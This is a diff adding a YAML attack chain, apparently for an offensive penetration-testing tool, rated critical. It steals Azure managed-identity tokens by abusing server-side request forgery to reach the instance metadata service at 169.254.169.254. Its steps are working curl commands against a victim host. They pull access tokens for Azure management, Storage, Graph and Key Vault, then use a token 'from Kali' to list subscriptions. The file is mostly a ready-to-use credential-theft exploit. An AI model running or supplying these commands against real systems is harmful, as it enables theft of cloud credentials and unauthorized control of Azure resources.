@@ -1,0 +1,48 @@
+chain_id: azure_imds_via_ssrf
+title: "Azure — pull managed-identity token via SSRF to IMDS"
+severity: CRITICAL
+tags: [azure, cloud, ssrf, imds, managed-identity, credentials]
+
+trigger:
+  any_of:
+    - { kind: "azure-imds-target" }
+    - { path_pattern: "(?i)/(fetch|proxy|preview|render|callback|webhook|url=)" }
+
+description: |
+  Azure VM / App Service instances with a managed identity assigned
+  expose http://169.254.169.254/metadata/. The /identity/oauth2/token
+  endpoint hands out an Entra ID (AAD) access token bound to that
+  managed identity — full Azure RM access from your laptop.
+
+steps:
+  - id: 1
+    title: "Required header — Metadata: true (and api-version)"
+    command: |
+      curl -s "http://$VICTIMA/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+        -H 'Metadata: true'
+
+  - id: 2
+    title: "Pull a token for management.azure.com"
+    command: |
+      curl -s "http://$VICTIMA/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+        -H 'Metadata: true'
+
+  - id: 3
+    title: "Use the token with az / curl"
+    command: |
+      az login --identity --debug   # if running on the VM
+      # Or from Kali:
+      curl -s -H 'Authorization: Bearer <TOKEN>' \
+        https://management.azure.com/subscriptions?api-version=2020-01-01
+
+  - id: 4
+    title: "Pull tokens for other audiences (Storage, Graph, Vault) too"
+    command: |
+      for r in 'https://storage.azure.com/' 'https://graph.microsoft.com/' 'https://vault.azure.net'; do
+        echo "== $r =="
+        curl -s "http://$VICTIMA/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$r" \
+          -H 'Metadata: true'
+      done
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
